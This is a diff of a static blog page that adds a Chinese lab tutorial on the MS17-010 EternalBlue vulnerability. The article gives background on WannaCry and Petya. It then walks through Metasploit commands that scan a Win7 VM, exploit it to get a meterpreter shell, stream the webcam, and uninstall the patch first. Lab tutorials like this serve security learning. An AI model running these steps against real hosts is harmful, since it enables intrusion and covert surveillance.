@@ -470,14 +470,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    959
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -497,7 +497,44 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17-010 永恒之蓝"></a>MS17-010 永恒之蓝</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，多个国家，国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
+<p>恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<p>本次黑客使用的是Petya勒索病毒的变种Petwarp，攻击时仍然使用了永恒之蓝勒索漏洞，并会获取系统用户名与密码进行内网传播。</p>
+<p>本次爆发使用了已知OFFICE漏洞、永恒之蓝SMB漏洞、局域网感染等网络自我复制技术，使得病毒可以在短时间内呈爆发态势。同时，该病毒与普通勒索病毒不同，其不会对电脑中的每个文件都进行加密，而是通过加密硬盘驱动器主文件表(MFT)，使主引导记录(MBR)不可操作，通过占用物理磁盘上的文件名，大小和位置的信息来限制对完整系统的访问，从而让电脑无法启动，相较普通勒索病毒对系统更具破坏性。</p>
+<h3 id="具体实验操作过程"><a href="#具体实验操作过程" class="headerlink" title="具体实验操作过程"></a>具体实验操作过程</h3><p>首先先搭建好win7和kali的环境，就是网络能否和主机ping通，确保win7和kali的网络处在同一个局域网中！</p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/1.png"></p>
+<p>如上图： 输入msfconsole进入此工具。</p>
+<p>如下图： 终端输入search ms17_010，搜索msfconsole中所有关于ms17_010的东西</p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/2.png"></p>
+<p>输入 use 3 即我们首先用这个命令来探测目标机器是否有永恒之蓝漏洞</p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/3.png"></p>
+<p>然后输入<code>show options</code> 查看所需哪些参数 上图所示，忘记标注了。。。</p>
+<p>（当然你不探测也没有关系）</p>
+<p>输入 set rhosts + win7的ip地址</p>
+<p>输入Run跑起来</p>
+<p>下图： 可以发现它说 发现了好像存在MS17_010的漏洞！</p>
+<p>输入 search ms17_010 就是返回到关于永恒之蓝漏洞的所有搜索的地方</p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/4.png"></p>
+<p>然后 use 0  就是使用这个模块</p>
+<p>然后show options  查看所需哪些参数</p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/5.png"></p>
+<p>我们可以看到RHOSTS和RPORT对应的yes,意为所需的参数<br>RPORT是445端口，不用管。但RHOSTS是空的，所以我们来设置一下</p>
+<p><code>Set rhosts 192.168.10.130</code></p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/6.png"></p>
+<p>然后 run/exploit  运行/攻击 就可以了。</p>
+<p>出现上面的红框的内容就是表示成功了！</p>
+<p>下图中 回车，显示出了 meterpreter 就代表成功，输入shell就可以进入win7</p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/7.png"></p>
+<p>虚拟机的命令终端了！</p>
+<p>Ctrl+C 退出后 在meterpreter里 例如输入 webcam_stream就可以做出相应的功能了（就是获得win7虚拟机摄像头的权限）。除此之外（还有很多命令）再次不再阐述。</p>
+<p>注意事项：win 7虚拟机摄像头的权限需要在VM里调一下设置。图在最后：</p>
+<p>右键win 7虚拟机，然后选择一个 可移动设备 的选项，里面有摄像头的权限！连接即可。</p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/8.png"></p>
+<p><img src="/2022/01/01/MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/9.png"></p>
+<p>注意事项！:</p>
+<p>Win7虚拟机，现在win 7 系统已经更新了永恒之蓝的漏洞补丁，需要卸载补丁才能用kali虚拟机完成永恒之蓝的漏洞利用！</p>
+<p>右键电脑 控制面板里，选择卸载软件，很容易找到一个 “安全”的补丁，卸载掉重新启动即可！</p>
+
                 
             </div>
             <hr/>
@@ -1288,7 +1325,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">4.3k</span>&nbsp;字
+                class="white-color">5.3k</span>&nbsp;字
             
             
             
